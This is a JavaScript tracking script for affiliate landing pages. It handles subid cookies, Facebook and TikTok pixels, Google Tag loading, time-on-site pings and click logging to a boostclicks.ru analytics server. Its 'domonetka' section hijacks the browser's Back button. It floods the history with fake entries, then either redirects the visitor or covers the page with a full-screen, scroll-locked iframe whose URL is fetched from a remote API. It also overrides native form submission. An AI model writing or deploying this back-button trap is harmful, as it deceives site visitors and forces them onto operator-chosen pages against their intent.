// indexPxl.js — unified, stable subid logic + pixels + click logging
// Key rule: subid is NEVER overwritten once established (Keitaro _subid wins; otherwise long BoostClicks fallback).
// Also: forms always get the established subid (even if submitted via form.submit()).

(function () {
    'use strict';

    var KEITARO_COOKIE = '_subid';
    var PLACEHOLDER_SUBID = '{subid}';
    var FALLBACK_COOKIE = 'subidBC';
    var FALLBACK_TTL = 7200; // 2h

    function getCookie(name) {
        try {
            var matches = document.cookie.match(
                new RegExp('(?:^|; )' + name.replace(/([$?*|{}()[\]\\/+^])/g, '\\$1') + '=([^;]*)')
            );
            return matches ? decodeURIComponent(matches[1]) : null;
        } catch (e) {
            return null;
        }
    }

    function setCookie(name, value, maxAgeSeconds) {
        if (!value) return;
        var maxAge = maxAgeSeconds || FALLBACK_TTL;
        try {
            document.cookie =
                name + '=' + encodeURIComponent(String(value)) + '; path=/; max-age=' + maxAge;
        } catch (e) { }
    }

    function setSession(key, value) {
        if (value === undefined || value === null || value === '') return;
        try { sessionStorage.setItem(key, String(value)); } catch (e) { }
    }

    function getSession(key) {
        try { return sessionStorage.getItem(key); } catch (e) { return null; }
    }

    function isSubdomain(hostname) {
        if (!hostname) return false;
        var normalized = hostname.replace(/^www\./i, '');
        return normalized.split('.').length > 2;
    }

    function hostnameSafe() {
        try { return (window.location.hostname || 'host').replace(/\s+/g, ''); }
        catch (e) { return 'host'; }
    }

    function hasValidKeitaroSubid() {
        var c = getCookie(KEITARO_COOKIE);
        return !!(c && c !== PLACEHOLDER_SUBID);
    }

    function makeLongSubid(hostname) {
        var ts = Date.now();
        var rand = Math.random().toString(36).slice(2, 10);
        return 'boostclicks_' + hostname + '_' + ts + '_' + rand;
    }

    function replacePlaceholderInputs(subid) {
        if (!subid) return;
        var inputs;
        try {
            inputs = document.querySelectorAll(
                'form input[value="' + PLACEHOLDER_SUBID + '"], form input[data-boostclicks-subid="1"]'
            );
        } catch (e) {
            inputs = [];
        }

        for (var i = 0; i < inputs.length; i++) {
            var input = inputs[i];
            try {
                input.value = subid;
                input.setAttribute('value', subid);
                input.setAttribute('data-boostclicks-subid', '1');
            } catch (e) { }
        }
    }

    // --------- Establish subid ONCE (Keitaro wins; else fallback long) ----------
    function getEstablishedSubid() {
        // 1) Keitaro cookie always wins
        if (hasValidKeitaroSubid()) return getCookie(KEITARO_COOKIE);

        // 2) Session already established
        var existing = getSession('external_id');
        if (existing && existing !== PLACEHOLDER_SUBID) return existing;

        // 3) Cookie fallback for navigation to thank-you page
        var fromCookie = getCookie(FALLBACK_COOKIE);
        if (fromCookie && fromCookie !== PLACEHOLDER_SUBID) return fromCookie;

        // 4) Create long fallback
        return makeLongSubid(hostnameSafe());
    }

    function syncSubidEverywhere(subid) {
        if (!subid) return;

        // Important: do not overwrite if Keitaro exists (but we still sync storage for thank-you usage)
        setSession('boostclicks_subid', subid);
        setSession('external_id', subid);
        setSession('event_id', subid);

        // Keep cookie for 2 hours for thank-you page / cross-page usage
        if (String(subid).indexOf('boostclicks_') === 0) {
            setCookie(FALLBACK_COOKIE, subid, FALLBACK_TTL);
        }

        // Expose hooks for other IIFEs
        window.__boostclicksSubidOverride = subid;
    }

    // Only override {subid} on MAIN domains when Keitaro cookie is missing
    function shouldOverrideFormSubid() {
        if (hasValidKeitaroSubid()) return false;
        return !isSubdomain(hostnameSafe());
    }

    function ensureSubidApplied() {
        var subid = getEstablishedSubid();

        // Sync for thank-you logic
        syncSubidEverywhere(subid);

        // Fill forms only when Keitaro is absent and we're on main domain
        if (shouldOverrideFormSubid()) {
            replacePlaceholderInputs(subid);
            // When fallback is used, your original logic disabled time-on-site
            window.__boostclicksDisableTimeOnSite = true;
        }

        return subid;
    }

    // Export hooks expected by other parts of your script
    window.__boostclicksDisableTimeOnSite = window.__boostclicksDisableTimeOnSite || false;
    window.__boostclicksReplaceSubidInputs = replacePlaceholderInputs;
    window.__boostclicksShouldOverrideSubid = shouldOverrideFormSubid();

    function attachSubmitHandler() {
        // capture=true to run early
        document.addEventListener('submit', function () {
            try { ensureSubidApplied(); } catch (e) { }
        }, true);
    }

    function patchNativeSubmit() {
        if (window.__boostclicksFormSubmitPatched) return;
        window.__boostclicksFormSubmitPatched = true;

        var native = HTMLFormElement.prototype.submit;
        HTMLFormElement.prototype.submit = function () {
            try { ensureSubidApplied(); } catch (e) { }
            return native.apply(this, arguments);
        };
    }

    function initFallbackBlock() {
        // Establish immediately so thank-you page can rely on sessionStorage/cookie
        ensureSubidApplied();
        attachSubmitHandler();
        patchNativeSubmit();
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initFallbackBlock);
    } else {
        initFallbackBlock();
    }
})();


// Main tracking script: handles pixel params + domonetka + GTM + time-on-site.
(function () {
    function getCookie(name) {
        const matches = document.cookie.match(
            new RegExp('(?:^|; )' + name.replace(/([$?*|{}()[\]\\/+^])/g, '\\$1') + '=([^;]*)')
        );
        return matches ? decodeURIComponent(matches[1]) : null;
    }

    function safeTrim(v) {
        if (v === undefined || v === null) return '';
        return String(v).trim();
    }

    function getDomonetkaFromGlobal() {
        try {
            if (typeof domonetka !== 'undefined') {
                var v = safeTrim(domonetka);
                if (v && v !== '{domonetka}' && /^https?:\/\//i.test(v)) return v;
            }
        } catch (e) { }
        return '';
    }

    function getDomonetkaFromStorage() {
        // sessionStorage is preferred; cookie fallback helps for fast back navigation.
        try {
            var s = safeTrim(sessionStorage.getItem('domonetkaBC'));
            if (s && /^https?:\/\//i.test(s)) return s;
        } catch (e) { }
        var c = safeTrim(getCookie('domonetkaBC'));
        if (c && /^https?:\/\//i.test(c)) return c;
        return '';
    }

    function setDomonetkaSourceStorage(src) {
        src = safeTrim(src);
        if (!src) return;
        try { sessionStorage.setItem('domonetkaSourceBC', src); } catch (e) { }
        try { document.cookie = 'domonetkaSourceBC=' + encodeURIComponent(src) + '; path=/; max-age=7200'; } catch (e) { }
    }

    function getDomonetkaSourceFromStorage() {
        try {
            var s = safeTrim(sessionStorage.getItem('domonetkaSourceBC'));
            if (s) return s;
        } catch (e) { }
        var c = safeTrim(getCookie('domonetkaSourceBC'));
        return c || '';
    }

    function setDomonetkaStorage(url, source) {
        url = safeTrim(url);
        if (!url) return;
        try { sessionStorage.setItem('domonetkaBC', url); } catch (e) { }
        try { document.cookie = 'domonetkaBC=' + encodeURIComponent(url) + '; path=/; max-age=7200'; } catch (e) { }
        if (source) setDomonetkaSourceStorage(source);
    }

    function buildDomonetkaUrlWithMappedParams(domUrl) {
        const currentUrlParams = new URLSearchParams(window.location.search);
        const newUrlParams = new URLSearchParams();

        const paramMap = {
            source: 'source',
            ev: 'ev',
            acc: 'sub_id_2',
            ad: 'sub_id_11',
            placement: 'sub_id_3',
            buyer: 'sub_id_4',
            pxl: 'pxl',
            adset: 'sub_id_5',
            gclid: 'gclid',
            gt: 'gt',
            pt: 'pt'
        };

        Object.entries(paramMap).forEach(function ([srcParam, targetParam]) {
            if (currentUrlParams.has(srcParam)) {
                newUrlParams.set(targetParam, currentUrlParams.get(srcParam));
            }
        });

        const qs = newUrlParams.toString();
        return qs ? (domUrl + '?' + qs) : domUrl;
    }

    function showDomonetkaFrame(finalUrl) {
        finalUrl = safeTrim(finalUrl);
        if (!finalUrl) return;

        // show only once per page session to prevent stacking overlays
        if (window.__boostclicksDomonetkaFrameShown === 1) return;
        window.__boostclicksDomonetkaFrameShown = 1;

        try {
            var wrap = document.getElementById('boostclicks-domonetka-frame-wrap');
            if (!wrap) {
                wrap = document.createElement('div');
                wrap.id = 'boostclicks-domonetka-frame-wrap';
                wrap.style.position = 'fixed';
                wrap.style.left = '0';
                wrap.style.top = '0';
                wrap.style.width = '100%';
                wrap.style.height = '100%';
                wrap.style.zIndex = '2147483647';
                wrap.style.background = '#fff';
                wrap.style.pointerEvents = 'auto';

                var iframe = document.createElement('iframe');
                iframe.id = 'boostclicks-domonetka-frame';
                iframe.style.border = '0';
                iframe.style.width = '100%';
                iframe.style.height = '100%';
                iframe.setAttribute('referrerpolicy', 'no-referrer-when-downgrade');
                iframe.setAttribute('loading', 'eager');

                wrap.appendChild(iframe);
                document.body.appendChild(wrap);
            }

            var ifr = document.getElementById('boostclicks-domonetka-frame');
            if (ifr) ifr.src = finalUrl;

            // prevent scrolling under overlay
            try { document.documentElement.style.overflow = 'hidden'; } catch (e) { }
            try { document.body.style.overflow = 'hidden'; } catch (e) { }
        } catch (e) { }
    }

    // mode: 'redirect' | 'frame'
    function initDomonetka(domUrl, mode) {
        domUrl = safeTrim(domUrl);
        mode = safeTrim(mode) || 'redirect';
        if (!domUrl) return;

        if (window.__boostclicksDomonetkaInit === 1) return;
        window.__boostclicksDomonetkaInit = 1;

        // Keep for thank-you / other scripts.
        try { sessionStorage.setItem('dom', domUrl); } catch (e) { }

        try {
            window.onpopstate = function (event) {
                if (!event || !event.state) return;

                let finalUrl = domUrl;
                try { finalUrl = buildDomonetkaUrlWithMappedParams(domUrl); } catch (e) { }

                if (mode === 'frame') {
                    showDomonetkaFrame(finalUrl);
                    return;
                }

                try { location.replace(finalUrl); } catch (e) { location.href = finalUrl; }
            };

            for (let i = 0; i < 10; i++) {
                setTimeout(function () {
                    history.pushState({}, '', window.location.href);
                }, i * 50);
            }
        } catch (error) { }
    }

    function fetchDomonetkaForDomain(domain) {
        domain = safeTrim(domain);
        if (!domain) return;

        // Avoid repeated calls per page.
        if (window.__boostclicksDomonetkaFetch === 1) return;
        window.__boostclicksDomonetkaFetch = 1;

        var url = 'https://analytics.boostclicks.ru/api/domonetka.php?domain=' + encodeURIComponent(domain);

        function onUrl(u) {
            u = safeTrim(u);
            if (!u) return;
            setDomonetkaStorage(u, 'api');
            // Same trigger (Back/Swipe), but iframe overlay instead of redirect
            initDomonetka(u, 'frame');
        }

        try {
            if (window.fetch) {
                var ctrl = null;
                var timeoutId = null;
                try {
                    ctrl = new AbortController();
                    timeoutId = setTimeout(function () { try { ctrl.abort(); } catch (e) { } }, 1500);
                } catch (e) { ctrl = null; }

                fetch(url, { method: 'GET', mode: 'cors', signal: ctrl ? ctrl.signal : undefined })
                    .then(function (r) { return r && r.ok ? r.json() : null; })
                    .then(function (data) {
                        if (timeoutId) clearTimeout(timeoutId);
                        if (data && data.url) onUrl(data.url);
                    })
                    .catch(function () { if (timeoutId) clearTimeout(timeoutId); });
                return;
            }
        } catch (e) { }

        // XHR fallback
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', url, true);
            xhr.timeout = 1500;
            xhr.onreadystatechange = function () {
                if (xhr.readyState !== 4) return;
                if (xhr.status !== 200) return;
                try {
                    var data = JSON.parse(xhr.responseText || '{}');
                    if (data && data.url) onUrl(data.url);
                } catch (e) { }
            };
            xhr.send(null);
        } catch (e) { }
    }

    const urlParams = new URLSearchParams(window.location.search);
    const pxl = urlParams.get('pxl') || '';
    const ttPixel = urlParams.get('pixel') || '';
    const contentIds = urlParams.get('content_ids');

    const subidCookie = getCookie('_subid');
    const subid = (subidCookie && subidCookie !== '{subid}')
        ? subidCookie
        : (window.__boostclicksSubidOverride || sessionStorage.getItem('external_id') || null);

    // domonetka:
    // - if comes from global variable domonetka => keep redirect mode
    // - if comes from API lookup (domonetka.php) => use frame mode
    const domFromGlobal = getDomonetkaFromGlobal();
    const domFromStorage = domFromGlobal ? '' : getDomonetkaFromStorage();
    const domonetkaUrlNow = domFromGlobal || domFromStorage;

    if (domonetkaUrlNow) {
        if (domFromGlobal) {
            setDomonetkaStorage(domonetkaUrlNow, 'global');
            initDomonetka(domonetkaUrlNow, 'redirect');
        } else {
            const src = getDomonetkaSourceFromStorage() || 'api';
            initDomonetka(domonetkaUrlNow, (src === 'global') ? 'redirect' : 'frame');
        }
    } else {
        // Only makes sense on main domains (same rule as fallback subid generation).
        try {
            var hn = (window.location.hostname || '').replace(/^www\./i, '');
            if (hn && hn.split('.').length === 2) {
                fetchDomonetkaForDomain(hn);
            }
        } catch (e) { }
    }

    const setSessionItem = (key, value) => {
        if (value === undefined || value === null || value === '') return;
        try { sessionStorage.setItem(key, String(value)); } catch (e) { }
    };

    const setCookie = (name, value, maxAgeSeconds) => {
        if (!value) return;
        var safe = encodeURIComponent(String(value));
        var maxAge = maxAgeSeconds || 7200;
        try {
            document.cookie = name + '=' + safe + '; path=/; max-age=' + maxAge;
        } catch (e) { }
    };

    setSessionItem('pxl', pxl);
    setSessionItem('content_ids', contentIds);
    setSessionItem('tt_pixel', ttPixel);

    // Do NOT overwrite an existing external_id/event_id if already set
    try {
        if (!sessionStorage.getItem('external_id') && subid) setSessionItem('external_id', subid);
        if (!sessionStorage.getItem('event_id') && subid) setSessionItem('event_id', subid);
    } catch (e) { }

    if (subid && String(subid).indexOf('boostclicks_') === 0) {
        setCookie('subidBC', subid, 7200);
    }

    // Init Facebook Pixel when pxl present.
    if (pxl) {
        !function (f, b, e, v, n, t, s) {
            if (f.fbq) return;
            n = f.fbq = function () {
                n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments);
            };
            if (!f._fbq) f._fbq = n;
            n.push = n;
            n.loaded = true;
            n.version = '2.0';
            n.queue = [];
            t = b.createElement(e);
            t.async = true;
            t.src = v;
            s = b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t, s);
        }(window, document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');

        fbq('init', pxl);
        if (contentIds) {
            fbq('track', 'PageView', { content_ids: contentIds });
        } else {
            fbq('track', 'PageView');
        }
    }

    // Init TikTok Pixel PageView when tt pixel present.
    (function initTikTokPageView() {
        const pixelId = (urlParams.get('pixel') || sessionStorage.getItem('tt_pixel') || '').trim();
        if (!pixelId) return;

        try {
            const key = 'tt_pageview_sent_' + pixelId;
            if (sessionStorage.getItem(key) === '1') return;
            sessionStorage.setItem(key, '1');
        } catch (e) { }

        if (!window.ttq) {
            !function (w, d, t) {
                w.TiktokAnalyticsObject = t;
                var ttq = w[t] = w[t] || [];
                ttq.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie"];
                ttq.setAndDefer = function (t, e) {
                    t[e] = function () { t.push([e].concat([].slice.call(arguments, 0))); };
                };
                for (var i = 0; i < ttq.methods.length; i++) ttq.setAndDefer(ttq, ttq.methods[i]);
                ttq.instance = function (t) {
                    for (var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++) ttq.setAndDefer(e, ttq.methods[n]);
                    return e;
                };
                ttq.load = function (e, n) {
                    var i = "https://analytics.tiktok.com/i18n/pixel/events.js";
                    ttq._i = ttq._i || {};
                    ttq._i[e] = [];
                    ttq._i[e]._u = i;
                    ttq._t = ttq._t || {};
                    ttq._t[e] = +new Date;
                    ttq._o = ttq._o || {};
                    ttq._o[e] = n || {};
                    var o = d.createElement("script");
                    o.type = "text/javascript";
                    o.async = !0;
                    o.src = i + "?sdkid=" + e + "&lib=" + t;
                    var a = d.getElementsByTagName("script")[0];
                    a.parentNode.insertBefore(o, a);
                };
            }(window, document, 'ttq');
        }

        try {
            window.ttq.load(pixelId);
            window.ttq.page();
        } catch (e) { }
    })();

    // Store selected params in cookies for GTM.
    (function setUTMCookies() {
        const utmParameters = ['gt', 'pt', 'ad_id', 'acc', 'buyer', 'gclid'];
        utmParameters.forEach(function (param) {
            if (urlParams.has(param)) {
                const value = urlParams.get(param);
                try {
                    document.cookie = param + '=' + encodeURIComponent(value) + '; path=/; max-age=3600';
                } catch (e) { }
            }
        });
    })();

    // store key tags in cookies for 2 hours as fallback
    (function storeFallbackCookies() {
        var keys = ['gclid', 'gt', 'pt', 'acc', 'buyer'];
        keys.forEach(function (k) {
            if (urlParams.has(k)) {
                setCookie(k, urlParams.get(k), 7200);
            }
        });
    })();

    // Init Google Tag if present.
    if (urlParams.has('gt')) {
        const gt = urlParams.get('gt');
        const gtmScript = document.createElement('script');
        gtmScript.async = true;
        gtmScript.src = 'https://www.googletagmanager.com/gtag/js?id=' + gt;
        document.head.appendChild(gtmScript);
        window.dataLayer = window.dataLayer || [];
        window.gtag = function () { window.dataLayer.push(arguments); };
        gtag('js', new Date());
        gtag('config', gt);
    }

    // Time-on-site tracking (sub_id_21) when subid exists and not disabled.
    if (subid && subid !== '{subid}' && !window.__boostclicksDisableTimeOnSite) {
        const clickid = subid;
        const address = window.location.protocol + '//' + window.location.hostname + '?_update_tokens=1&sub_id=' + clickid;

        var step = 5;
        var counter = 0;
        setInterval(function () {
            counter += step;
            createPixel(address + '&sub_id_21=' + counter);
        }, step * 1000);
    }

    function createPixel(url) {
        var img = document.createElement('img');
        img.src = url;
        img.referrerPolicy = 'no-referrer-when-downgrade';
        img.style.display = 'none';
        document.body.appendChild(img);
    }
})();


// Click logging to analytics.boostclicks.ru (NEVER overwrites subid; only stores click_id separately).
(function () {
    function getCookie(name) {
        const matches = document.cookie.match(
            new RegExp('(?:^|; )' + name.replace(/([$?*|{}()[\]\\/+^])/g, '\\$1') + '=([^;]*)')
        );
        return matches ? decodeURIComponent(matches[1]) : null;
    }

    var subidCookie = getCookie('_subid');
    var subid = (subidCookie && subidCookie !== '{subid}')
        ? subidCookie
        : (window.__boostclicksSubidOverride || sessionStorage.getItem('external_id') || null);

    var hostname = window.location.hostname;

    // avoid duplicate logging on reloads
    try {
        if (sessionStorage.getItem('analytics_click_logged') === '1') return;
    } catch (e) { }

    var searchParams = new URLSearchParams(window.location.search);
    var tags = {};
    var allow = { gclid: 1, buyer: 1, acc: 1, gt: 1, pt: 1 };

    function decodeSafe(value) {
        if (!value) return '';
        try { return decodeURIComponent(String(value).replace(/\+/g, ' ')); }
        catch (e) { return String(value); }
    }

    var tagKeys = new Set([
        'source', 'ev', 'acc', 'ad', 'placement', 'buyer', 'adset', 'ad_id',
        'pxl', 'gclid', 'fbclid', 'yclid', 'ymclid', 'gt', 'pt', 'utm_id'
    ]);

    searchParams.forEach(function (value, key) {
        if (!value) return;
        var normalizedKey = key.toLowerCase();
        if (normalizedKey.indexOf('utm_') === 0 || tagKeys.has(normalizedKey) || allow[normalizedKey]) {
            var v = decodeSafe(value).trim();
            if (v) tags[normalizedKey] = v.slice(0, 200);
        }
    });

    // add from cookies if missing in url
    Object.keys(allow).forEach(function (k) {
        if (tags[k]) return;
        var cv = getCookie(k);
        if (!cv) return;
        cv = decodeSafe(cv).trim();
        if (!cv) return;
        tags[k] = cv.slice(0, 200);
    });

    var payload = { domain: hostname, subid: subid || null };
    if (Object.keys(tags).length > 0) payload.tags = tags;

    try {
        if (Object.keys(tags).length > 0) {
            sessionStorage.setItem('analytics_tags', JSON.stringify(tags));
        } else {
            sessionStorage.removeItem('analytics_tags');
        }
    } catch (e) { }

    try {
        fetch('https://analytics.boostclicks.ru/api/log-click.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
            .then(function (res) { return res.json(); })
            .then(function (data) {
                if (data && data.success && data.click_id) {
                    try {
                        sessionStorage.setItem('analytics_click_id', String(data.click_id));
                        sessionStorage.setItem('analytics_click_logged', '1');
                    } catch (e) { }
                }
            })
            .catch(function () { });
    } catch (e) { }
})();
